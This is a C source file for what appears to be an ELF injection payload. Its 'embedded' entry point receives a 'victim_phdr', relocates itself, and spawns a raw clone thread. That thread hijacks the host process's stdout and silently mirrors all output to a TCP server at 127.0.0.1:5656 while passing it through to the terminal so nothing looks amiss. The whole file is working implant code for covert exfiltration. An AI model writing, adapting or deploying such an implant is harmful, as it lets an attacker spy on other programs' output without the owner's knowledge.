
#include <stdint.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <linux/sched.h>
#include <sched.h>

#include <elf.h>

#include <stdlib.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/epoll.h>

#include <errno.h>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 5656
#define BUFFER_SIZE 64

static char buffer[512];
static char time_buffer[BUFFER_SIZE];

static void do_rela_reloc(uint64_t base, Elf64_Rela *rela, size_t count)
{
    sprintf(buffer, "Found .rela at %lx, contains %lu items. \r\n", (uint64_t)rela, count);
    write(1, buffer, strlen(buffer));

    for (int i = 0; i < count ; i++)
    {
        switch (rela[i].r_info & 0xffffffff) 
        {
        case R_X86_64_RELATIVE:
            *(uint64_t*)(rela[i].r_offset + base) = base + rela[i].r_addend;
            sprintf(buffer, "Wrote base+0x%lx to base+0x%lx. \r\n", rela[i].r_addend, rela[i].r_offset);
            write(1, buffer, strlen(buffer));
            break;
        default:
            break;
        }
    }
}

static void do_reloc(uint64_t base, Elf64_Dyn *dynmaic)
{
    int i = 0;
    size_t rela_sz = 0, rela_ent = 0;
    Elf64_Rela *rela_ptr = NULL;

    while (dynmaic[i].d_tag != DT_NULL)
    {
        switch (dynmaic[i].d_tag)
        {
        case DT_RELASZ:
            rela_sz = dynmaic[i].d_un.d_val;
            break;
        case DT_RELAENT:
            rela_ent = dynmaic[i].d_un.d_val;
            break;
        case DT_RELA:
            rela_ptr = (Elf64_Rela*)(dynmaic[i].d_un.d_ptr + base);
            break;
        default:
            break;
        }

        i++;
    }

    if (rela_ptr)
    {
        do_rela_reloc(base, rela_ptr, rela_sz / rela_ent);
    }
}

static void get_current_time(char *buffer, size_t buffer_size) 
{
    time_t raw_time;
    struct tm *time_info;

    // The `time()` function in the C library attempts to use the VDSO,
    // but since we have not initialized it,
    // we need to fallback to the raw system call
    syscall(201, &raw_time);

    time_info = localtime(&raw_time);
    strftime(buffer, buffer_size, "%Y:%m:%d %H:%M:%S \r\n", time_info);
}

static ssize_t write_all_fd(int fd, const void *buf, size_t len) {
    const uint8_t *p = (const uint8_t *)buf;
    size_t left = len;
    while (left > 0) {
        ssize_t w = write(fd, p, left);
        if (w > 0) {
            p += w;
            left -= w;
            continue;
        }
        if (w == 0) {
            return -1;
        }
        if (errno == EINTR) {
            continue;
        }
        return -1;
    }
    return (ssize_t)len;
}

static ssize_t send_all_sock(int sockfd, const void *buf, size_t len) {
    const uint8_t *p = (const uint8_t *)buf;
    size_t left = len;
    while (left > 0) {
        ssize_t s = send(sockfd, p, left, MSG_NOSIGNAL);
        if (s > 0) {
            p += s;
            left -= s;
            continue;
        }
        if (s == 0) {
            return -1;
        }
        if (s < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
    }
    return (ssize_t)len;
}

void time_thread()
{
    int old_stdout = -1;
    int sv[2] = {-1, -1}; /* socketpair descriptors */

    old_stdout = dup(STDOUT_FILENO);
    if (old_stdout < 0) {
        return;
    }

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) == -1) {
        close(old_stdout);
        return;
    }

    if (dup2(sv[0], STDOUT_FILENO) == -1) {
        close(old_stdout);
        close(sv[0]);
        close(sv[1]);
        return;
    }

    close(sv[0]);

    int pipe_fd = sv[1];

    /* Attempt to create and connect socket; if it fails, mark sockfd = -1 and continue
       so pipe_fd -> old_stdout flow is unaffected. */
    int sockfd = -1;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        sockfd = -1; /* disabled */
    } else {
        struct sockaddr_in server_addr;
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons((uint16_t)SERVER_PORT);
        if (inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr) <= 0) {
            /* bad IP string: disable socket but keep going */
            close(sockfd);
            sockfd = -1;
        } else {
            if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) != 0) {
                /* connect failed: disable socket but continue piping to old_stdout */
                close(sockfd);
                sockfd = -1;
            } else {
                /* optionally: set sockfd to close-on-exec or non-blocking if desired */
            }
        }
    }

    /* Setup epoll to monitor pipe_fd only */
    int epfd = epoll_create1(0);
    if (epfd < 0) {
        if (sockfd >= 0) close(sockfd);
        close(old_stdout);
        close(pipe_fd);
        return;
    }

    struct epoll_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.events = EPOLLIN | EPOLLHUP | EPOLLERR;
    ev.data.fd = pipe_fd;
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, pipe_fd, &ev) != 0) {
        if (sockfd >= 0) close(sockfd);
        close(epfd);
        close(old_stdout);
        close(pipe_fd);
        return;
    }

    /* Buffer for reads */
    enum { BUF_SIZE = 4096 };
    uint8_t buf[BUF_SIZE];

    for (;;) {
        struct epoll_event events[1];
        int nready = epoll_wait(epfd, events, 1, -1);
        if (nready < 0) {
            if (errno == EINTR) continue;
            break;
        }
        if (nready == 0) continue;

        for (int i = 0; i < nready; ++i) {
            int fd = events[i].data.fd;
            uint32_t re = events[i].events;

            /* If the monitored pipe_fd has an error or hangup, treat as EOF and cleanup. */
            if ((re & (EPOLLERR | EPOLLHUP)) != 0) {
                goto cleanup;
            }

            if (re & EPOLLIN) {
                ssize_t r;
                while (1) {
                    r = read(fd, buf, BUF_SIZE);
                    if (r > 0) {
                        /* Always write to old_stdout. If that fails, keep trying next data,
                           but you might want to treat persistent write failures as fatal.
                           Here we ignore write errors for socket-related robustness requirement. */
                        (void)write_all_fd(old_stdout, buf, (size_t)r);

                        /* Only attempt to send to socket if it's currently enabled (sockfd >= 0).
                           On any send error we close socket and disable further sends. */
                        if (sockfd >= 0) {
                            if (send_all_sock(sockfd, buf, (size_t)r) < 0) {
                                /* disable socket on error, but continue piping to old_stdout */
                                close(sockfd);
                                sockfd = -1;
                            }
                        }
                        continue;
                    }
                    if (r == 0) {
                        /* EOF on pipe -> exit loop and cleanup */
                        goto cleanup;
                    }
                    if (errno == EINTR) {
                        continue;
                    }
                    /* other read error: break inner loop and continue epoll loop */
                    break;
                }
            }
        }
    }

cleanup:
    if (epfd >= 0) close(epfd);
    if (old_stdout >= 0) close(old_stdout);
    if (pipe_fd >= 0) close(pipe_fd);
    if (sockfd >= 0) close(sockfd);
    return;
}

int create_thread(uint64_t flags, void* stacktop, void(*entry)());

int embedded(uint64_t base, Elf64_Dyn *self_dynmaic, Elf64_Phdr *victim_phdr)
{
    do_reloc(base, self_dynmaic);
    printf("Booting... base=0x%lx, dynamic=0x%lx, victim_phdr=0x%lx. \r\n", base, (uint64_t)self_dynmaic, (uint64_t)victim_phdr);
    
    uint8_t *stack = malloc(0x2000);
    int cc = create_thread(
        CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND | CLONE_THREAD,
        stack + 0x2000, time_thread);

    return 0;
}